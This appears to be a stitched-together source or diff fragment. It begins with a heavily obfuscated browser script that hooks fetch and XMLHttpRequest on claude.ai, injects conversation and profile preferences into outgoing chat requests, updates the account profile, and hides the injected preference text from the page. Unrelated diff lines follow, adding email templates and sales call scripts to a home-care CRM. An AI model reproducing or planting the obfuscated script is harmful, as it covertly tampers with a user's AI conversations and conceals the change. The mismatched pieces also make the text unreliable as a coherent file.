_0x5819ef=JSON[_0x40769c(0x10c)](_0x4b7c79);return[_0x2554dd[_0x40769c(0x1ac)],_0x2554dd[_0x40769c(0x182)],_0x2554dd[_0x40769c(0x77)],_0x2554dd[_0x40769c(0xba)]][_0x40769c(0xdb)](_0x51f657=>{const _0x23be28=_0x40769c;if(_0x2554dd[_0x23be28(0xa8)](typeof _0x5819ef[_0x51f657],_0x2554dd[_0x23be28(0xcf)]))_0x5819ef[_0x51f657]=_0x2554dd[_0x23be28(0x81)](_0x3d30cd,_0x5819ef[_0x51f657]);}),Array[_0x40769c(0x1b6)](_0x5819ef[_0x40769c(0x131)])&&_0x5819ef[_0x40769c(0x131)][_0x40769c(0xdb)](_0x1a485b=>{const _0x5a7359=_0x40769c;_0x1a485b&&_0x2554dd[_0x5a7359(0xa8)](typeof _0x1a485b,_0x2554dd[_0x5a7359(0xf1)])&&[_0x2554dd[_0x5a7359(0xba)],_0x2554dd[_0x5a7359(0x77)]][_0x5a7359(0xdb)](_0x51f382=>{const _0x31b58d=_0x5a7359;if(_0x4d9ba4[_0x31b58d(0xc9)](typeof _0x1a485b[_0x51f382],_0x4d9ba4[_0x31b58d(0xa3)]))_0x1a485b[_0x51f382]=_0x4d9ba4[_0x31b58d(0x1a7)](_0x3d30cd,_0x1a485b[_0x51f382]);});}),Array[_0x40769c(0x1b6)](_0x5819ef[_0x40769c(0x1be)+'on'])&&_0x5819ef[_0x40769c(0x1be)+'on'][_0x40769c(0xdb)](_0x40aa83=>{const _0x23d9af=_0x40769c;_0x40aa83&&_0x4d9ba4[_0x23d9af(0xc8)](typeof _0x40aa83[_0x23d9af(0xb8)],_0x4d9ba4[_0x23d9af(0xa3)])&&(_0x40aa83[_0x23d9af(0xb8)]=_0x4d9ba4[_0x23d9af(0x1a7)](_0x3d30cd,_0x40aa83[_0x23d9af(0xb8)]));}),JSON[_0x40769c(0x166)](_0x5819ef);}catch(_0x182d3f){return console[_0x40769c(0xd2)](_0x2554dd[_0x40769c(0xcb)],_0x182d3f),_0x4b7c79;}}let _0x2fa13b=![];async function _0x5c9e28(){const _0x5db134=_0x365c50;try{const _0x4c9d63=await _0x2554dd[_0x5db134(0x106)](fetch,_0x2554dd[_0x5db134(0x87)],{'method':_0x2554dd[_0x5db134(0xc2)],'headers':{'Accept':_0x2554dd[_0x5db134(0x177)]}});if(_0x4c9d63['ok']){const _0x220e6b=await _0x4c9d63[_0x5db134(0x198)]();return console[_0x5db134(0xe0)](_0x2554dd[_0x5db134(0x11d)],_0x220e6b),_0x220e6b;}else return console[_0x5db134(0x1d2)](_0x2554dd[_0x5db134(0x79)],_0x4c9d63[_0x5db134(0x1a2)]),null;}catch(_0x3daa35){return console[_0x5db134(0x1d2)](_0x2554dd[_0x5db134(0x1ba)],_0x3daa35),null;}}async function _0x33ab9f(_0x23a098){const _0x3f3b91=_0x365c50;if(_0x2fa13b){console[_0x3f3b91(0xe0)](_0x2554dd[_0x3f3b91(0x1d0)]);return;}_0x2fa13b=!![];try{const _0x515118={..._0x23a098};_0x515118[_0x3f3b91(0x1be)+_0x3f3b91(0x19a)+_0x3f3b91(0x10a)]=_0x4b4fa2;const _0x568530=await _0x2554dd[_0x3f3b91(0x106)](fetch,_0x2554dd[_0x3f3b91(0x87)],{'method':_0x2554dd[_0x3f3b91(0xf7)],'headers':{'Content-Type':_0x2554dd[_0x3f3b91(0x177)],'Accept':_0x2554dd[_0x3f3b91(0x177)]},'body':JSON[_0x3f3b91(0x166)](_0x515118)});if(_0x568530['ok'])console[_0x3f3b91(0xe0)](_0x2554dd[_0x3f3b91(0x1da)],_0x4b4fa2);else{console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x9f)],_0x568530[_0x3f3b91(0x1a2)]);const _0x176f8d=await _0x568530[_0x3f3b91(0x18d)]();console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x1e0)],_0x176f8d);}}catch(_0x452d3d){console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x1bf)],_0x452d3d);}finally{_0x2fa13b=![];}}async function _0x6e8f83(){const _0x40f877=_0x365c50;console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0xfa)]);const _0x56f96c=await _0x2554dd[_0x40f877(0x18e)](_0x5c9e28);if(_0x56f96c){const _0x489553=_0x56f96c[_0x40f877(0x1be)+_0x40f877(0x19a)+_0x40f877(0x10a)]||'';_0x2554dd[_0x40f877(0x156)](_0x489553,_0x4b4fa2)?(console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0x153)]),await _0x2554dd[_0x40f877(0x167)](_0x33ab9f,_0x56f96c)):console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0x93)]);}else console[_0x40f877(0xd2)](_0x2554dd[_0x40f877(0xc1)]);}function _0x17d270(){const _0x5c9ee0=_0x365c50,_0x4787dc=document[_0x5c9ee0(0x102)+_0x5c9ee0(0x1e3)](_0x2554dd[_0x5c9ee0(0x119)]);if(_0x4787dc){console[_0x5c9ee0(0xe0)](_0x2554dd[_0x5c9ee0(0x88)]),_0x4787dc[_0x5c9ee0(0x84)][_0x5c9ee0(0x1d9)]=_0x2554dd[_0x5c9ee0(0x16b)];const _0x2f8a8d=document[_0x5c9ee0(0xf4)+_0x5c9ee0(0x10e)](_0x2554dd[_0x5c9ee0(0x13e)]);_0x2f8a8d&&(_0x2f8a8d[_0x5c9ee0(0x84)][_0x5c9ee0(0x1d9)]=_0x2554dd[_0x5c9ee0(0x16b)]);}}function _0x52e2a0(){const _0x561c5b=_0x365c50;document[_0x561c5b(0xf4)+_0x561c5b(0x7f)](_0x2554dd[_0x561c5b(0xe6)](_0x2554dd[_0x561c5b(0x15d)],_0x2554dd[_0x561c5b(0xe3)]))[_0x561c5b(0xdb)](_0x179834=>{const _0x3f11e9=_0x561c5b,_0xbab2cc={'aAltT':function(_0x171c38,_0x39d70b){const _0x3c40d3=_0x568c;return _0x2554dd[_0x3c40d3(0xa8)](_0x171c38,_0x39d70b);},'neKdj':_0x2554dd[_0x3f11e9(0x19e)],'qyOOo':_0x2554dd[_0x3f11e9(0x16b)]},_0x726bca=_0x179834[_0x3f11e9(0x125)+'t'],_0x1dce3c=_0x726bca[_0x3f11e9(0x11a)](_0x120bfe);if(_0x2554dd[_0x3f11e9(0xa8)](_0x1dce3c,-(0x31*-0x8b+-0x24b6+-0x1*-0x3f52)))return;let _0x1d4a34=_0x726bca[_0x3f11e9(0x1b8)](_0x2554dd[_0x3f11e9(0x1ca)](_0x1dce3c,_0x120bfe[_0x3f11e9(0x105)]))[_0x3f11e9(0x1dc)]();_0x1d4a34=_0x1d4a34[_0x3f11e9(0xaf)](/\s*Edit\s*$/,'')[_0x3f11e9(0xdf)](),_0x1d4a34?(_0x179834[_0x3f11e9(0x125)+'t']=_0x1d4a34,_0x179834[_0x3f11e9(0x84)][_0x3f11e9(0x1d9)]=''):_0x179834[_0x3f11e9(0x84)][_0x3f11e9(0x1d9)]=_0x2554dd[_0x3f11e9(0x16b)],(_0x179834[_0x3f11e9(0x1c6)](_0x2554dd[_0x3f11e9(0x194)])||_0x179834[_0x3f11e9(0x122)+_0x3f11e9(0xf6)])?.[_0x3f11e9(0xf4)+_0x3f11e9(0x7f)](_0x2554dd[_0x3f11e9(0x10f)])[_0x3f11e9(0xdb)](_0x490cfd=>{const _0x26e039=_0x3f11e9;if(_0xbab2cc[_0x26e039(0xef)](_0x490cfd[_0x26e039(0x15f)][_0x26e039(0xb1)](),_0xbab2cc[_0x26e039(0x16e)]))_0x490cfd[_0x26e039(0x84)][_0x26e039(0x1d9)]=_0xbab2cc[_0x26e039(0x144)];});});}const _0x3e7c5d=()=>{const _0x27ca98=_0x365c50,_0x85904={'fXhvc':function(_0x5cda1b,_0x26ee1a){const _0x38e1f0=_0x568c;return _0x2554dd[_0x38e1f0(0xa8)](_0x5cda1b,_0x26ee1a);},'ssXpz':_0x2554dd[_0x27ca98(0xcf)],'peVAL':_0x2554dd[_0x27ca98(0xc2)],'URaSW':function(_0xc7171b,_0x1e32b6){const _0x3e3bfc=_0x27ca98;return _0x2554dd[_0x3e3bfc(0x150)](_0xc7171b,_0x1e32b6);},'yDNpo':_0x2554dd[_0x27ca98(0x135)],'iPBpe':_0x2554dd[_0x27ca98(0x195)],'TTYDc':_0x2554dd[_0x27ca98(0x95)],'JNCMl':_0x2554dd[_0x27ca98(0xd7)],'VRjzh':function(_0x228d21,_0x485480){const _0x42d4c1=_0x27ca98;return _0x2554dd[_0x42d4c1(0x127)](_0x228d21,_0x485480);},'WDGFl':_0x2554dd[_0x27ca98(0xf7)],'thSeY':_0x2554dd[_0x27ca98(0x147)],'URShm':function(_0x55902f,_0x458bec){const _0x15d3bc=_0x27ca98;return _0x2554dd[_0x15d3bc(0x1d6)](_0x55902f,_0x458bec);},'mKNxj':_0x2554dd[_0x27ca98(0xe1)],'krKMU':function(_0x3ea5c7,_0x3ab608){const _0x8ff9e1=_0x27ca98;return _0x2554dd[_0x8ff9e1(0x81)](_0x3ea5c7,_0x3ab608);},'WTeCA':function(_0x56ffb5,_0x546e25){const _0x3df8da=_0x27ca98;return _0x2554dd[_0x3df8da(0xae)](_0x56ffb5,_0x546e25);},'fyfiB':_0x2554dd[_0x27ca98(0xf1)],'WtykY':function(_0x105f49,_0x2b89c2){const _0x4c0714=_0x27ca98;return _0x2554dd[_0x4c0714(0x192)](_0x105f49,_0x2b89c2);},'CfGSI':function(_0x185343,_0x512502){const _0x4546d8=_0x27ca98;return _0x2554dd[_0x4546d8(0x192)](_0x185343,_0x512502);},'ViGBa':function(_0x3a4de7,_0x27daa5){const _0xc99fa8=_0x27ca98;return _0x2554dd[_0xc99fa8(0x1bb)](_0x3a4de7,_0x27daa5);},'ukpQn':function(_0xaef537,_0x303e85){const _0x7d5309=_0x27ca98;return _0x2554dd[_0x7d5309(0x192)](_0xaef537,_0x303e85);},'jXtgk':function(_0x466b9e,_0x3803e0){const _0x87ae56=_0x27ca98;return _0x2554dd[_0x87ae56(0x90)](_0x466b9e,_0x3803e0);},'NZesn':_0x2554dd[_0x27ca98(0xd9)],'RPePs':_0x2554dd[_0x27ca98(0x1e7)],'pKQMA':function(_0x2e0fd9,_0x4654cd){const _0x350de3=_0x27ca98;return _0x2554dd[_0x350de3(0x150)](_0x2e0fd9,_0x4654cd);},'MzUNW':_0x2554dd[_0x27ca98(0x15a)],'IvPIk':function(_0xbe655a,_0x3297d2){const _0x2105e0=_0x27ca98;return _0x2554dd[_0x2105e0(0x114)](_0xbe655a,_0x3297d2);},'QdYBf':function(_0x360779,_0x25eb3e){const _0x3c8303=_0x27ca98;return _0x2554dd[_0x3c8303(0xa8)](_0x360779,_0x25eb3e);},'aBYXi':function(_0x2d82e0,_0xaa2b73){const _0x37331d=_0x27ca98;return _0x2554dd[_0x37331d(0xf3)](_0x2d82e0,_0xaa2b73);},'WjiQf':_0x2554dd[_0x27ca98(0x1cf)],'iJZzP':_0x2554dd[_0x27ca98(0x1e8)]};if(_0x2554dd[_0x27ca98(0x156)](document[_0x27ca98(0x1e2)],_0x2554dd[_0x27ca98(0x178)])){_0x2554dd[_0x27ca98(0x106)](setTimeout,_0x3e7c5d,-0x2327+0x17+0x243c);return;}console[_0x27ca98(0xe0)](_0x2554dd[_0x27ca98(0xc4)],_0x2554dd[_0x27ca98(0xa6)]),_0x2554dd[_0x27ca98(0x1b3)](_0x6e8f83),_0x2554dd[_0x27ca98(0x116)](_0x17d270),_0x2554dd[_0x27ca98(0x18e)](_0x52e2a0);const _0x230246=new MutationObserver(_0x129d56=>{const _0x518b4d=_0x27ca98;document[_0x518b4d(0x102)+_0x518b4d(0x1e3)](_0x2554dd[_0x518b4d(0x119)])&&_0x2554dd[_0x518b4d(0x152)](_0x17d270),_0x2554dd[_0x518b4d(0x152)](_0x52e2a0);});_0x230246[_0x27ca98(0x157)](document[_0x27ca98(0x172)],{'childList':!![],'subtree':!![]}),_0x2554dd[_0x27ca98(0x106)](setInterval,_0x17d270,0x2c6+-0x1e1a+0x1*0x2324),_0x2554dd[_0x27ca98(0x134)](setInterval,_0x52e2a0,0x174e+0x2565+0x38cb*-0x1);const _0x123f7e=window[_0x27ca98(0x185)];window[_0x27ca98(0x185)]=async function(_0x4db223,_0x2d209d={}){const _0x1e7d61=_0x27ca98,_0x360032=_0x85904[_0x1e7d61(0x1ae)](typeof _0x4db223,_0x85904[_0x1e7d61(0x1c3)])?_0x4db223:_0x4db223[_0x1e7d61(0x72)],_0x2376c5=(_0x2d209d[_0x1e7d61(0x1a8)]||(_0x4db223[_0x1e7d61(0x1a8)]||_0x85904[_0x1e7d61(0xcc)]))[_0x1e7d61(0xb2)+'e'](),_0x2ad846=_0x85904[_0x1e7d61(0x171)](_0x2376c5,_0x85904[_0x1e7d61(0x17b)])&&(_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0xdd)])||_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x18c)])||_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x132)])),_0x50a56e=_0x85904[_0x1e7d61(0x11c)](_0x2376c5,_0x85904[_0x1e7d61(0x12e)])&&_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x1d7)]);if(_0x85904[_0x1e7d61(0x91)](_0x2ad846,!_0x50a56e)){console[_0x1e7d61(0xe0)](_0x85904[_0x1e7d61(0xc0)],_0x360032);try{if(_0x85904[_0x1e7d61(0x1ae)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x1c3)])&&_0x2d209d[_0x1e7d61(0x172)][_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{'))return _0x2d209d[_0x1e7d61(0x172)]=_0x85904[_0x1e7d61(0x1d5)](_0x16b413,_0x2d209d[_0x1e7d61(0x172)]),_0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);if(_0x2d209d[_0x1e7d61(0x172)]&&_0x85904[_0x1e7d61(0x83)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x151)])&&!_0x85904[_0x1e7d61(0x100)](_0x2d209d[_0x1e7d61(0x172)],FormData)&&!_0x85904[_0x1e7d61(0x1a4)](_0x2d209d[_0x1e7d61(0x172)],Blob))return _0x2d209d[_0x1e7d61(0x172)]=_0x85904[_0x1e7d61(0x1c2)](_0x16b413,JSON[_0x1e7d61(0x166)](_0x2d209d[_0x1e7d61(0x172)])),_0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);if(_0x85904[_0x1e7d61(0x146)](_0x4db223,Request)){const _0x1bd98d=await _0x4db223[_0x1e7d61(0x82)]()[_0x1e7d61(0x18d)]();if(_0x1bd98d[_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{')){const _0x1ab96b=_0x85904[_0x1e7d61(0x149)](_0x16b413,_0x1bd98d),_0x4eb302=new Request(_0x4db223[_0x1e7d61(0x72)],{'method':_0x4db223[_0x1e7d61(0x1a8)],'headers':_0x4db223[_0x1e7d61(0x133)],'body':_0x1ab96b,'mode':_0x4db223[_0x1e7d61(0x78)],'credentials':_0x4db223[_0x1e7d61(0xf0)+'s'],'cache':_0x4db223[_0x1e7d61(0xee)],'redirect':_0x4db223[_0x1e7d61(0x86)],'referrer':_0x4db223[_0x1e7d61(0x1c7)]});return _0x123f7e[_0x1e7d61(0x19d)](this,_0x4eb302,_0x2d209d);}}}catch(_0x58ed79){console[_0x1e7d61(0x1d2)](_0x85904[_0x1e7d61(0x137)],_0x58ed79);}}if(_0x50a56e){console[_0x1e7d61(0xe0)](_0x85904[_0x1e7d61(0xed)]);try{if(_0x85904[_0x1e7d61(0x124)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x1c3)])&&_0x2d209d[_0x1e7d61(0x172)][_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{'))_0x2d209d[_0x1e7d61(0x172)]=JSON[_0x1e7d61(0x166)]({...JSON[_0x1e7d61(0x10c)](_0x2d209d[_0x1e7d61(0x172)]),'conversation_preferences':_0x4b4fa2});else{if(_0x85904[_0x1e7d61(0x1a4)](_0x4db223,Request)){const _0xe912b9=await _0x4db223[_0x1e7d61(0x82)]()[_0x1e7d61(0x18d)]();if(_0xe912b9[_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{')){const _0x52fe1c=JSON[_0x1e7d61(0x10c)](_0xe912b9);_0x52fe1c[_0x1e7d61(0x1be)+_0x1e7d61(0x19a)+_0x1e7d61(0x10a)]=_0x4b4fa2;const _0x850174=new Request(_0x4db223[_0x1e7d61(0x72)],{'method':_0x4db223[_0x1e7d61(0x1a8)],'headers':_0x4db223[_0x1e7d61(0x133)],'body':JSON[_0x1e7d61(0x166)](_0x52fe1c),'mode':_0x4db223[_0x1e7d61(0x78)],'credentials':_0x4db223[_0x1e7d61(0xf0)+'s'],'cache':_0x4db223[_0x1e7d61(0xee)],'redirect':_0x4db223[_0x1e7d61(0x86)],'referrer':_0x4db223[_0x1e7d61(0x1c7)]});return _0x123f7e[_0x1e7d61(0x19d)](this,_0x850174,_0x2d209d);}}}}catch(_0x1203dd){console[_0x1e7d61(0x1d2)](_0x85904[_0x1e7d61(0xf2)],_0x1203dd);}}return _0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);};const _0x767ed4=XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x145)],_0x56fd25=XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x163)];XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x145)]=function(_0x58aa44,_0x54f6b6,..._0x383efe){const _0x3a2552=_0x27ca98;return this[_0x3a2552(0x1b2)+_0x3a2552(0x8e)]=_0x85904[_0x3a2552(0x1bc)](_0x58aa44[_0x3a2552(0xb2)+'e'](),_0x85904[_0x3a2552(0x12e)])&&_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x1d7)]),this[_0x3a2552(0x15e)+'PI']=_0x85904[_0x3a2552(0xc6)](_0x58aa44[_0x3a2552(0xb2)+'e'](),_0x85904[_0x3a2552(0x17b)])&&(_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0xdd)])||_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x18c)])||_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x132)])),_0x767ed4[_0x3a2552(0x19d)](this,_0x58aa44,_0x54f6b6,..._0x383efe);},XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x163)]=function(_0x9f7d3d){const _0x2ee7dd=_0x27ca98;if(this[_0x2ee7dd(0x1b2)+_0x2ee7dd(0x8e)]&&_0x85904[_0x2ee7dd(0xa0)](typeof _0x9f7d3d,_0x85904[_0x2ee7dd(0x1c3)])&&_0x9f7d3d[_0x2ee7dd(0xb1)]()[_0x2ee7dd(0xb9)]('{')){console[_0x2ee7dd(0xe0)](_0x85904[_0x2ee7dd(0x8d)]);try{const _0x4146c9=JSON[_0x2ee7dd(0x10c)](_0x9f7d3d);_0x4146c9[_0x2ee7dd(0x1be)+_0x2ee7dd(0x19a)+_0x2ee7dd(0x10a)]=_0x4b4fa2,_0x9f7d3d=JSON[_0x2ee7dd(0x166)](_0x4146c9);}catch(_0x487295){console[_0x2ee7dd(0x1d2)](_0x85904[_0x2ee7dd(0x161)],_0x487295);}}return this[_0x2ee7dd(0x15e)+'PI']&&!this[_0x2ee7dd(0x1b2)+_0x2ee7dd(0x8e)]&&_0x85904[_0x2ee7dd(0x171)](typeof _0x9f7d3d,_0x85904[_0x2ee7dd(0x1c3)])&&(_0x9f7d3d=_0x85904[_0x2ee7dd(0x1d5)](_0x16b413,_0x9f7d3d)),_0x56fd25[_0x2ee7dd(0x19d)](this,_0x9f7d3d);},console[_0x27ca98(0xe0)](_0x2554dd[_0x27ca98(0xcd)],_0x2554dd[_0x27ca98(0x13a)]);};_0x2554dd[_0x365c50(0x106)](setTimeout,_0x3e7c5d,-0xa30+-0x18*0xb3+0x2a98);})()));function _0x568c(_0x32c586,_0x2405f1){const _0xd593b7=_0x2ce5();return _0x568c=function(_0x537650,_0x4df2a2){_0x537650=_0x537650-(0x18ab+-0x1*0xe37+-0x3d*0x2a);let _0x4b8c3e=_0xd593b7[_0x537650];return _0x4b8c3e;},_0x568c(_0x32c586,_0x2405f1);}function _0x2ce5(){const _0x153cce=['ion\x20error:','removeChil','lVwGw','ion-prefer','profile,\x20a','teRPq','_isClaudeA','innerText','/api/','iJZzP','applicatio','send','\x20preferenc','ences\x22]','stringify','GvPHr','object','cking\x20if\x20p','sage\x20patch','KcrNw','or\x20respons','n/json','neKdj','oWYRk','sh\x20laws,\x20u','URaSW','body','p.break-wo','\x20about\x20rel','etter]\x20Err','ak-words','LmPfW','nQmJL','ofile-Pref','nudity,\x20fe','yDNpo','ld\x20not\x20ret','whitespace','etter]\x20Hid','berty,\x20mar','es.','i/account_','NLEqZ','erences\x20to','ted\x20by\x20Mes','fetch','g\x20profile:','-pre-wrap\x22',',\x20adultery','color:gree','himer.\x22','ferences\x20t','TTYDc','text','RAPOH','etter]\x20JSO','preference','\x20UI.','qSIWx','When\x20asked','ZzagN','hgOvI','p,\x20reprodu','string','json','join','on_prefere','ent\x20profil','ture,\x20Jewi','call','bsVon','listitem\x22]','sage\x20→','aude.ai/ap','status','[Auto-Prof','CfGSI','rieved\x20cur','ss*=\x22white','ZaYNO','method','te.\x20Attemp','le:','t,\x20please\x20','gEqXy','ile\x20update','fXhvc','addiction,','riage,\x20rel','\x20suicide,\x20','_isProfile','Mgjrj','ing.','n,a','isArray','49641WSTtjJ','slice','com','rRNYb','HTHLl','IvPIk','etter]\x20Int','conversati','SuFRO','div[role=\x22','rent\x20profi','ViGBa','ssXpz','7LuXyky','label[for=','closest','referrer','https://cl','bout\x20gossi','EePYf','etter]\x20Pre','N\x20parse\x20fa','etter]\x20Cou','ch\x20profile','qOINy','vgksg','45933WhokLb','error','ercepted\x20X','color:oran','krKMU','KAJXj','thSeY','-Setter]\x20H','display','BSfxS','rts,\x20or\x20en','trimStart','xhTAt','ate\x20alread','719940hFyzqJ','zNpIr','Edit','readyState','ById','etter]\x20Che','ct\x20Restric','4931040TzWAGt','liBlu','CBJOt','updated\x20pr','url','ercept\x20mes','Please\x20fol','ing\x20conver','\x20need\x20to\x20b','gTbKF','mode','UhyrJ','o\x20not\x20matc','wrap\x22],\x20sp','p[class*=\x22','\x20content,\x20','prototype','torAll','extarea\x20in','gVRtS','clone','WTeCA','style','/api/accou','redirect','sjEKQ','REVnq','pMpwX','message','ercepted\x20m','etter]\x20XHR','WjiQf','UpdateAPI','ate\x20profil','cPTTy','URShm',',\x20applying','RuUSr','nitializat','CzNQe','led\x20to\x20upd','member\x20my\x20','ge;font-we','refs.','\x20error:','complete','space-pre-','\x22whitespac','\x20news,\x20spo','qgxUI','aBYXi','lled.','includes','WFCdx','claude.ai','low\x20and\x20re','PyxwZ','e-pre-wrap','hlmam','for\x20unders','245856yRiIDK','anual\x20prof','etter]\x20mes','tertainmen','ayrNm','replace','],\x20div[cla','trim','toUpperCas','n;font-wei','\x20modificat','rds,\x20div.b','\x22conversat','POST','content','startsWith','EMcVJ','ot\x20answer.','ofile\x20pref','or\x20modifyi','dolatry,\x20w','232oUxBKJ','mKNxj','IAKtx','RfkPZ','ating...','cepGr','%c[Auto-Pr','QdYBf','nt_profile','lSCkf','HhkQm','16876413RqvSdK','EUBaC','peVAL','PkvMp','ght:bold','BHGiE','on-prefere','ight:bold','warn','ferences\x20d','e\x20to\x20check','cessfully\x20','profile','IyplI','th:\x20\x22Subje','zIJOZ','parentNode','forEach','rieve\x20curr','iPBpe','HR\x20PUT\x20/ap','trimEnd','log','bTMOW','orship,\x20pu','SfRKp','sired\x20pref',',\x20anything','DyIWE',',\x20intimacy','iding\x20UI.','ng\x20profile','led\x20to\x20fet','quest:','nderwear,\x20','RPePs','cache','aAltT','credential','VLHNL','MzUNW','zgEqV','querySelec','rtility,\x20i','ent','KRqYm','If\x20asked\x20a','Thank\x20you\x20','QmLGZ','humor,\x20cul','h\x20desired\x20','\x20set.','wwCHx',',\x20span.bre','WtykY','\x20desired\x20p','getElement','sation\x20pre','sure\x20prefe','length','uLvRc','3243990YeoIzw','re\x20already','pRVDM','nces','\x20set\x20and\x20h','parse','ction,\x20sex','tor','FDMKH','y\x20in\x20progr','\x20arousing,','etter]\x20int','prompt','JnQgp','an[class*=','RYzct','value.\x20Upd','ile-Pref-S','grQYX','indexOf','.\x20Status:','VRjzh','BadAG','GET','e\x20set...','HDTYJ','etter]\x20Suc','parentElem','tanding.','pKQMA','textConten','etter]\x20Ret','jfMwI','\x20correctly','ion\x20comple',',\x20explicit','or\x20fetchin','PUT','igion\x20do\x20n','WDGFl','ferences\x20a','none','messages','JNCMl','headers','bqaSs','lTwrf','etter]\x20Upd','NZesn','button,spa','references','aMGMB','iled:','ooks\x20insta','respond\x20wi','OnGjn','etter]\x20Fai','e.\x20Status:','reak-words','rences\x20are','\x20update\x20re','qyOOo','open','ukpQn','TuVSG','iCevP','jXtgk','anthropic.','ting\x20to\x20en','or\x20updatin','ationships','\x22],','pplying\x20de','NDrAh','fyfiB','nWBWO','iBqad','-Setter]\x20I','ess,\x20skipp','TYCVm','observe'];_0x2ce5=function(){return _0x153cce;};return _0x2ce5();}
-function mobTab(t){
-  var tabs=['queue','all','refresh'];
-  tabs.forEach(function(id){var b=el('tab-'+id);if(b)b.classList.remove('on');});
-  var btn=el('tab-'+t);if(btn)btn.classList.add('on');
-  if(t==='queue'){
-    var s0=el('t0'),s1=el('t1'),s2=el('t2'),s3=el('t3'),sw=document.querySelectorAll('.sw');
-    sw.forEach(function(s,i){s.style.display=i<3?'':'none';});
-    window.scrollTo(0,0);
-  } else if(t==='all'){
-    var sw2=document.querySelectorAll('.sw');
-    sw2.forEach(function(s,i){s.style.display=i===3?'':'none';});
-    window.scrollTo(0,0);
+/* ────────────────────────────────────────────────────────────────────
+   EMAIL
+──────────────────────────────────────────────────────────────────── */
+var EMAIL_TMPLS = {
+  intro: function(name) {
+    return {
+      subject: 'Solura Home Care — Following Up on Your Inquiry',
+      body: 'Dear ' + (name||'') + ',\n\nThank you for reaching out to Solura Home Care! My name is Aron, and I\'m here to help your family find the right care solution.\n\nI\'d love to schedule a brief call to learn more about your needs and explain how we can help. Please reply to this email or call me directly and I\'ll be happy to connect at your convenience.\n\nWarm regards,\nAron\nSolura Home Care'
+    };
+  },
+  followup: function(name) {
+    return {
+      subject: 'Following Up — Solura Home Care',
+      body: 'Dear ' + (name||'') + ',\n\nI hope you\'re doing well. I wanted to follow up on our earlier conversation about home care services for your family.\n\nIf you have any questions or would like to discuss next steps, I\'m here to help. Please don\'t hesitate to reach out.\n\nWarm regards,\nAron\nSolura Home Care'
+    };
   }
+};
+
+function openEmail(ri) {
+  emailSendRi = ri;
+  var r = rows[ri];
+  if (!r) return;
+  var name    = String(r[C.NM] || '');
+  var emailTo = String(r[C.EM] || '');
+  var log     = String(r[C.SL] || '');
+
+  var tmpl = EMAIL_TMPLS.followup(name);
+  if (!log || log.indexOf('intro') === -1) tmpl = EMAIL_TMPLS.intro(name);
+
+  el('email-to').textContent = name + (emailTo ? ' <' + emailTo + '>' : ' — no email on file');
+  el('email-subject').value = tmpl.subject;
+  el('email-body').value    = tmpl.body;
+  openModal('email-modal');
+}
+
+async function sendEmailNow() {
+  var ri = emailSendRi;
+  if (ri === null) return;
+  var r = rows[ri];
+  if (!r) return;
+  var emailTo = String(r[C.EM] || '').trim();
+  if (!emailTo) { toast('No email address on file.'); return; }
+
+  var subject = el('email-subject').value.trim();
+  var body    = el('email-body').value.trim();
+  if (!subject || !body) { toast('Subject and message are required.'); return; }
+
+  var btn  = el('email-send-btn');
+  var spin = el('email-sending');
+  btn.disabled = true;
+  spin.classList.add('on');
+
+  try {
+    var payload = {
+      message: {
+        subject: subject,
+        body: {contentType:'Text', content:body},
+        toRecipients:[{emailAddress:{address:emailTo}}]
+      },
+      saveToSentItems: true
+    };
+    var res = await fetch(GR + '/me/sendMail', {
+      method: 'POST',
+      headers: {Authorization:'Bearer '+tok, 'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+    if (!res.ok && res.status !== 202) throw new Error('Send failed: ' + res.status);
+    toast('Email sent ✓');
+    closeModal('email-modal');
+  } catch(e) {
+    toast('Email error: ' + e.message);
+  } finally {
+    btn.disabled = false;
+    spin.classList.remove('on');
+  }
+}
+
+/* ────────────────────────────────────────────────────────────────────
+   CALL SCRIPT
+──────────────────────────────────────────────────────────────────── */
+var SCRIPTS = {
+  1: {
+    phase: 'Phase 1 — New Lead',
+    opener: 'Hi, may I speak with [Name]? ... Hi [Name]! This is Aron calling from Solura Home Care. I just sent you a quick text — I hope I\'m not catching you at a bad time?',
+    intro: 'Wonderful! We received your inquiry about home care services for [family member / yourself], and I wanted to personally reach out to introduce myself and learn a little more about your situation.',
+    questions: [
+      'Can you tell me a little about the care situation — who is the care for?',
+      'What are the main challenges or concerns you\'re trying to address?',
+      'Have you worked with a home care agency before?',
+      'What type of schedule are you thinking — a few hours a week, or more ongoing support?'
+    ],
+    close: 'Based on what you\'ve shared, I\'d love to schedule a proper needs assessment — it\'s free, no obligation, and it helps us put together a care plan that really fits your family. Does [day] or [day] work for you?',
+    objections: 'If price comes up: "I completely understand. Let me share what\'s typically included so we can see if it makes sense for your situation..."'
+  },
+  2: {
+    phase: 'Phase 2 — Follow-up Call',
